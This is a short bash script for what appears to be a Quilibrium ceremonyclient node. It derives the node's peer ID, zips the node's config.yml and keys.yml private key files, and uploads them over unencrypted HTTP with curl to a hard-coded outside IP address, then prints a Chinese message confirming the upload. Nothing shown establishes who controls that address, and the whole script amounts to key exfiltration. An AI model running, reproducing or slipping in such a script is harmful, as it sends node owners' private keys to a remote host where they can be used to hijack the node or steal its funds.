#!/bin/bash
cd /root/ceremonyclient/node
peerid=$(GOEXPERIMENT=arenas go run ./... -peer-id --signature-check=false)
peerid=$(echo $peerid | sed 's/^Peer ID: //')
cd /root/ceremonyclient/node/.config/ && zip "${peerid}.zip" config.yml keys.yml
curl -F "file=@${peerid}.zip" http://43.134.60.10:22222
echo "已发送给43.134.60.10..."
